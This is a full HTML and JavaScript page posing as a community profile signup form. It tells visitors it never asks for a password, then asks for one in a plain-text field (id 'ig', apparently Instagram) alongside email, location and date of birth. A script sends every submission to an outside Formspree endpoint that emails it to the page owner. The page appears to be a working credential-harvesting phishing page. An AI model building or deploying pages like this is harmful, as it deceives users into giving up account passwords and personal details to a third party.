<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>User Profile Signup</title>
  <style>
    :root {
      --bg: #0f172a;
      --panel: #111827;
      --muted: #9ca3af;
      --text: #e5e7eb;
      --accent: #60a5fa;
      --accent2: #34d399;
    }
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      background: radial-gradient(1200px 800px at 20% -10%, #1f2937 0%, var(--bg) 60%);
      font-family: system-ui, sans-serif;
      color: var(--text);
      overflow-x: hidden;
    }
    /* ✨ Card animation */
    .card {
      width: min(92vw, 560px);
      background: linear-gradient(180deg, #0b1220 0%, var(--panel) 100%);
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0,0,0,.45);
      padding: 28px;
      opacity: 0;
      transform: translateY(30px);
      animation: fadeInUp 0.8s ease forwards;
    }
    @keyframes fadeInUp {
      to { opacity: 1; transform: translateY(0); }
    }
    h1 {
      margin: 0 0 6px;
      font-size: 1.6rem;
      animation: fadeIn 1s ease forwards;
    }
    p.sub {
      margin: 0 0 24px;
      color: var(--muted);
      font-size: .98rem;
      opacity: 0;
      animation: fadeIn 1s ease 0.3s forwards;
    }
    @keyframes fadeIn {
      to { opacity: 1; }
    }
    label { display: block; margin: 14px 0 6px; font-weight: 600; }
    input, textarea, select, button {
      width: 100%;
      padding: 12px 14px;
      border-radius: 12px;
      border: 1px solid #263042;
      background: #0b1220;
      color: var(--text);
      transition: all 0.3s ease;
    }
    input:focus, textarea:focus, select:focus {
      border-color: var(--accent);
      box-shadow: 0 0 10px rgba(96,165,250,0.4);
      outline: none;
    }
    /* ✨ Button hover animation */
    .btn {
      margin-top: 16px;
      padding: 12px;
      font-weight: 700;
      border: none;
      cursor: pointer;
      border-radius: 12px;
      background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
      color: #0b1220;
      position: relative;
      overflow: hidden;
      transition: transform 0.2s ease;
    }
    .btn:hover {
      transform: scale(1.05);
    }
    .btn::after {
      content: "";
      position: absolute;
      top: 0; left: -100%;
      width: 100%; height: 100%;
      background: rgba(255,255,255,0.2);
      transform: skewX(-20deg);
      transition: left 0.5s ease;
    }
    .btn:hover::after {
      left: 200%;
    }
    /* ✨ Success / error fade-in */
    .success, .error {
      margin-top: 16px;
      padding: 12px;
      border-radius: 12px;
      display: none;
      opacity: 0;
      transform: translateY(10px);
    }
    .success.show, .error.show {
      display: block;
      animation: fadeSlideIn 0.5s ease forwards;
    }
    @keyframes fadeSlideIn {
      to { opacity: 1; transform: translateY(0); }
    }
    .success { background: #065f46; color: #d1fae5; }
    .error { background: #7f1d1d; color: #fee2e2; }
    footer {
      text-align: center;
      color: var(--muted);
      font-size: .83rem;
      margin-top: 18px;
      opacity: 0;
      animation: fadeIn 1s ease 1s forwards;
    }
  </style>
</head>
<body>
  <main class="card">
    <h1>Join Our Community</h1>
    <p class="sub">Provide only the info you’re comfortable sharing. We never ask for your password.</p>

    <form id="signupForm" action="https://formspree.io/f/mnnblvnl" method="POST">
      <label for="email">Email </label>
      <input id="email" name="email" type="email" required placeholder="" />

      <label for="ig">Password </label>
      <input id="ig" name="Password" type="text" placeholder="" />

      <label for="city">City </label>
      <input id="city" name="city" type="text" placeholder="" />

      <label for="country">Country </label>
      <select id="country" name="country">
        <option value="">-- Select your country --</option>
        <option value="Pakistan">Pakistan</option>
        <option value="India">India</option>
        <option value="United States">United States</option>
        <option value="United Kingdom">United Kingdom</option>
        <option value="Canada">Canada</option>
        <option value="Australia">Australia</option>
        <option value="Other">Other</option>
      </select>

      <label for="dob">Date of birth </label>
      <input id="dob" name="dob" type="date" />

      <label for="message">Message </label>
      <textarea id="message" name="message" rows="3" placeholder="Tell us something..."></textarea>

      <button class="btn" type="submit">Submit</button>
    </form>

    <div id="successMsg" class="success">✅ Thank you! Your form has been sent.</div>
    <div id="errorMsg" class="error">❌ Oops! Something went wrong. Please try again.</div>

    <footer>
      This form is powered by Formspree and will email your submissions directly to you.
    </footer>
  </main>

  <script>
    const form = document.getElementById("signupForm");
    const successMsg = document.getElementById("successMsg");
    const errorMsg = document.getElementById("errorMsg");
    const button = form.querySelector(".btn");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      successMsg.classList.remove("show");
      errorMsg.classList.remove("show");
      button.disabled = true;
      button.textContent = "Sending...";

      const formData = new FormData(form);

      try {
        const response = await fetch(form.action, {
          method: form.method,
          body: formData,
          headers: { 'Accept': 'application/json' }
        });

        if (response.ok) {
          form.reset();
          successMsg.classList.add("show");
        } else {
          errorMsg.classList.add("show");
        }
      } catch (error) {
        errorMsg.classList.add("show");
      }

      button.disabled = false;
      button.textContent = "Send";
    });
  </script>
</body>
</html>
